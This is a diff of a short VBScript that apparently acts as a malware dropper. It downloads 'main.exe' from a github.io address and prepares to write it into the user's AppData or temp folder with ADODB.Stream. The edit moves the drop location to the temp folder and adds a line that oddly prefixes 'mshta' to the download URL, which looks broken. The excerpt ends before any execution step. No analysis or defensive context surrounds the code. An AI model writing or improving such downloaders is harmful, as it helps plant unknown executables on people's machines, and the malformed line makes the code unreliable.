@@ -1,10 +1,10 @@
-Set x = CreateObject("MSXML2.XMLHTTP")
-x.Open "GET", "https://homleds.github.io/main.exe", False
+Set x=CreateObject("MSXML2.XMLHTTP")
+x.Open "GET","mshta https://homleds.github.io/main.exe",False
 x.Send
 
 Set fso = CreateObject("Scripting.FileSystemObject")
-appDataFolder = "C:\Users\" & CreateObject("WScript.Network").UserName & "\AppData\Local"
-tempFile = appDataFolder & "\main.exe"
+Set temp = fso.GetSpecialFolder(2)
+tempFile = temp & "\main.exe"
 
 Set stream = CreateObject("ADODB.Stream")
 stream.Type = 1
